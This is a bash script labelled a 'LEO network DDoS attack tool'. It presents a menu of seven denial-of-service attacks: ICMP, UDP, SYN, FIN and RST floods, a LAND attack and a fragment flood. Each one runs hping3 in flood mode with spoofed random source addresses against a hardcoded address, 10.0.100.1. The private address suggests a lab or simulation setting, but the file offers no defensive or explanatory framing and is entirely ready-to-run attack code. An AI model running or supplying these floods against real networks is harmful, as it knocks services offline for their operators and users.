#!/bin/bash

echo "======================================="
echo "LEO NETWORK DDoS ATTACK TOOL"
echo "======================================="

TARGET="10.0.100.1"

# ==============================
# ICMP FLOOD
# ==============================
icmp_flood() {
    echo "[*] ICMP Flood Attack"
    hping3 --icmp --flood --rand-source -d 4096 $TARGET
}

# ==============================
# UDP FLOOD
# ==============================
udp_flood() {
    echo "[*] UDP Flood Attack"
    hping3 --udp --flood --rand-source -d 1400 -p 9000 $TARGET
}

# ==============================
# TCP SYN FLOOD
# ==============================
syn_flood() {
    echo "[*] TCP SYN Flood Attack"
    hping3 -S --flood --rand-source -p 9100 $TARGET
}

# ==============================
# FIN FLOOD
# ==============================
fin_flood() {
    echo "[*] TCP FIN Flood Attack"
    hping3 -F --flood --rand-source -p 9100 $TARGET
}

# ==============================
# RST FLOOD
# ==============================
rst_flood() {
    echo "[*] TCP RST Flood Attack"
    hping3 -R --flood --rand-source -p 9100 $TARGET
}

# ==============================
# LAND ATTACK
# ==============================
land_attack() {
    echo "[*] LAND Attack"
    hping3 -S -a $TARGET -p 9000 --flood $TARGET
}

# ==============================
# FRAGMENT FLOOD
# ==============================
fragment_flood() {
    echo "[*] Fragment Flood Attack"
    hping3 --udp -f --flood --rand-source -d 1400 -p 9000 $TARGET
}

# ==============================
# MENU
# ==============================
echo ""
echo "1) ICMP Flood"
echo "2) UDP Flood"
echo "3) TCP SYN Flood"
echo "4) TCP FIN Flood"
echo "5) TCP RST Flood"
echo "6) LAND Attack"
echo "7) Fragment Flood"
echo ""

read -p "Select attack mode: " opt

case $opt in
    1) icmp_flood ;;
    2) udp_flood ;;
    3) syn_flood ;;
    4) fin_flood ;;
    5) rst_flood ;;
    6) land_attack ;;
    7) fragment_flood ;;
    *) echo "Invalid option" ;;
esac